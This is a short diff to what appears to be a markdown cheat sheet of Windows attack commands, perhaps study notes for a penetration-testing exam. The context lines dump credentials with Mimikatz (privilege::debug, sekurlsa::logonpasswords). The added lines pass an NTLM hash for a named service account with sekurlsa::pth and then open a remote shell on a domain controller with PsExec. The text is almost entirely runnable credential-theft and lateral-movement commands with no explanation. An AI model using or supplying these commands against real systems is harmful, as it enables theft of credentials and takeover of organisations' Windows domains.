@@ -218,8 +218,15 @@ privilege::debug
 #dump the credentials of all logged-on users using the Sekurlsa
 sekurlsa::logonpasswords
 
-#dump tickets
-sekurlsa::tickets
+# get the hash here
+
+#pass the hash
+
+sekurlsa::pth /user:zensvc /domain:exam.com /ntlm:d098fa8675acd7d26ab86eb2581233e5 /run:PowerShell.exe
+
+#get remote shell
+.\PsExec.exe \\dc02 cmd.exe
+
 
 ```
 
